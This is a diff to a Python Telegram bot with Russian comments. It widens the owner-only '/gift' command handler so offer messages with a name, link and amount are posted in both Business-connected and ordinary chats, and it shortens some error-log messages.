@@ -37,11 +37,9 @@ def normalize_url(raw):
 
 
 def parse_gift_command(text):
-    """
-    Гибкий парсер: принимает и /gift "Название" "ссылка" 100,
-    и /gift "Название" "ссылка" "100",
-    и /gift Название ссылка 100.
-    """
+    """Гибкий парсер: /gift "Название" "ссылка" 100 или /gift "Название" "ссылка" "100"."""
+    # Убираем возможный суффикс @username после /gift
+    text = re.sub(r'^/gift(@\w+)?', '/gift', text)
     body = text.replace("/gift", "", 1).strip()
     if not body:
         return None
@@ -80,7 +78,7 @@ def parse_gift_command(text):
     amount = re.sub(r"\D", "", amount_part) if amount_part else ""
 
     if not name or not url or not amount:
-        print(f"[PARSE] Не удалось распарсить: name={name!r}, url={url!r}, amount={amount!r}")
+        print(f"[PARSE] Не удалось: name={name!r}, url={url!r}, amount={amount!r}")
         return None
 
     return name, url, amount
@@ -205,17 +203,17 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
         elif "USER_IS_BLOCKED" in err:
             print("  → Ты заблокирован.")
         elif "PEER_FLOOD" in err:
-            print("  → Спам-блок Telegram на аккаунте. Жди 6–24 часа.")
+            print("  → Спам-блок Telegram.")
         elif "PEER_ID_INVALID" in err:
             print("  → Чат не поддерживает Business-сообщения.")
         elif "BUSINESS_CONNECTION" in err:
             print("  → Telegram отклонил Business-соединение для этого чата.")
         elif "CHAT_ADMIN_REQUIRED" in err:
-            print("  → Это группа/канал — Business работает только в личке.")
+            print("  → Это группа/канал.")
         elif "FLOOD_WAIT" in err:
-            print("  → Слишком часто. Подожди указанное время.")
+            print("  → Слишком часто. Подожди.")
         else:
-            print(f"  → Неизвестная ошибка, разбери текст выше.")
+            print(f"  → Неизвестная ошибка.")
 
         return None
 
@@ -245,7 +243,7 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
     t.start()
 
 
-# ─────────────────────── BUSINESS CONNECTION ───────────────────────
+# ─────────────────────── BUSINESS CONNECTION (только для логов) ───────────────────────
 
 @bot.business_connection_handler(func=lambda conn: True)
 def on_business_connection(connection):
@@ -257,55 +255,69 @@ def on_business_connection(connection):
     print(f"[BUSINESS] Активно: {connection.is_enabled}")
 
 
-# ─────────────────────── ОСНОВНОЙ ОБРАБОТЧИК ───────────────────────
+# ─────────────────────── УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК ───────────────────────
 
-@bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
-def handle_business_message(message):
-    conn_id = message.business_connection_id
+@bot.message_handler(func=lambda m: m.text is not None, content_types=["text"])
+def handle_all_messages(message):
+    """Ловит ВСЕ текстовые сообщения, включая бизнес-чаты."""
+    conn_id = getattr(message, "business_connection_id", None)
     sender_id = message.from_user.id
+    text = message.text
 
-    print(f"[BUSINESS] Сообщение от {sender_id}: {message.text!r}")
+    print(f"[MSG] От {sender_id} в чате {message.chat.id}: {text!r} | conn_id={conn_id}")
 
+    # Реагируем только на владельца
     if sender_id != OWNER_ID:
         return
 
-    if not message.text.startswith("/gift"):
+    # Только /gift
+    if not text.startswith("/gift"):
         return
 
-    parsed = parse_gift_command(message.text)
+    parsed = parse_gift_command(text)
     if not parsed:
-        send_business_message(
-            message.chat.id,
-            "❌ Неверный формат команды.\n\n"
-            "Используй: /gift \"Название\" \"ссылка\" 100",
-            conn_id,
-        )
+        if conn_id:
+            send_business_message(
+                message.chat.id,
+                "❌ Неверный формат команды.\n\n"
+                "Используй: /gift \"Название\" \"ссылка\" 100",
+                conn_id,
+            )
         return
 
     name, url, amount = parsed
-    print(f"[BUSINESS] Оффер: name={name!r}, url={url}, amount={amount}")
+    print(f"[GIFT] name={name!r}, url={url}, amount={amount}")
 
-    try_delete_message(message.chat.id, message.message_id, conn_id)
+    if conn_id:
+        try_delete_message(message.chat.id, message.message_id, conn_id)
 
-    sent = send_business_message(
-        message.chat.id,
-        build_offer_message(name, url, amount),
-        conn_id,
-        reply_markup=build_offer_keyboard(),
-    )
+        sent = send_business_message(
+            message.chat.id,
+            build_offer_message(name, url, amount),
+            conn_id,
+            reply_markup=build_offer_keyboard(),
+        )
 
-    if sent is None:
-        return
+        if sent is None:
+            return
 
-    with offers_lock:
-        offers[sent.message_id] = {
-            "name": name,
-            "url": url,
-            "amount": amount,
-            "finished": False,
-            "conn_id": conn_id,
-            "chat_id": message.chat.id,
-        }
+        with offers_lock:
+            offers[sent.message_id] = {
+                "name": name,
+                "url": url,
+                "amount": amount,
+                "finished": False,
+                "conn_id": conn_id,
+                "chat_id": message.chat.id,
+            }
+    else:
+        # Обычный (не Business) чат — просто отвечаем
+        bot.send_message(
+            message.chat.id,
+            build_offer_message(name, url, amount),
+            parse_mode="HTML",
+            reply_markup=build_offer_keyboard(),
+        )
 
 
 # ─────────────────────── КНОПКИ ───────────────────────
@@ -396,7 +408,7 @@ def health():
 
 
 def run_bot():
-    print("✨ Business-бот запущен (в облаке).")
+    print("✨ Бот запущен (в облаке).")
     print(f"OWNER_ID: {OWNER_ID}")
     bot.infinity_polling(
         allowed_updates=[
